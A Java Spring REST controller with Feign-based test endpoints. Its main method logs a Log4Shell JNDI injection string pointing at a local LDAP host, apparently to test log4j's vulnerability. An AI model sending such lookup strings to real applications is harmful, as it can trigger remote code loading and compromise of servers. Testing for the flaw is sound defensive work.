package com.notsay.user.web.controller;

import com.netflix.discovery.converters.Auto;
import com.notsay.orderfeignapi.service.OrderApi;
//import com.notsay.user.web.vo.OrderTestVO;
import com.notsay.orderfeignapi.service.vo.OrderTestVO;
import com.notsay.user.domain.entity.order.OrderEntity;
import com.notsay.user.domain.entity.users.UsersEntity;
import com.notsay.user.domain.repo.order.OrderRepo;
import com.notsay.user.domain.repo.users.UsersRepo;
import com.notsay.user.service.TestService;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.client.RestTemplate;
import sun.applet.Main;

/**
 * @description:
 * @author: dsy
 * @date: 2021/12/5 12:21
 */
@RestController
@RequestMapping("/api/v1/test")
public class TestController {
    @Autowired
    RestTemplate restTemplate;

    @Autowired
    OrderApi orderApi;

    @Autowired
    TestService testService;

    @GetMapping("/test1")
    public String helloTest(){
        String s = orderApi.test1();

        return s;
    }

    @GetMapping("/test2")
    public OrderTestVO orderTest(){
        OrderTestVO orderTestVO = orderApi.test2();
        return orderTestVO;
    }

    @GetMapping("dataSource")
    public String dataSourceTest(){
        testService.datasource();
        return "success";
    }

    private static Logger LOG= LogManager.getLogger(Main.class);
    public static void main(String[] args) {
        LOG.error("${jndi:ldap://localhost:9999/Exploit}");
    }
}